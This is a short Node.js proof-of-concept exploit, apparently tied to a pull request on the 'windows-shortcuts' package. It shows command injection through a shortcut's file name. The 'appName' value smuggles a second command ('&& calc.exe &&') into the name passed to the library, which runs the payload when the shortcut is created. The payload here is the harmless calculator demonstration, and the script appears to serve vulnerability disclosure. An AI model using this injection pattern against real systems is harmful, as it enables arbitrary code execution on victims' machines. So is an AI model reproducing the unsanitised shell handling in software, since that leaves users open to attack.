//https://github.com/j201/windows-shortcuts/pull/1
var ws = require("windows-shortcuts");

var payload = "calc.exe";
var link_path = "%USERPROFILE%/Desktop/";
var appName = 'Facebook" && ' + payload + ' && echo "';
var icon_path = "%WINDIR%/notepad.exe";

ws.create(link_path + appName + ".lnk", {
  icon: icon_path,
});
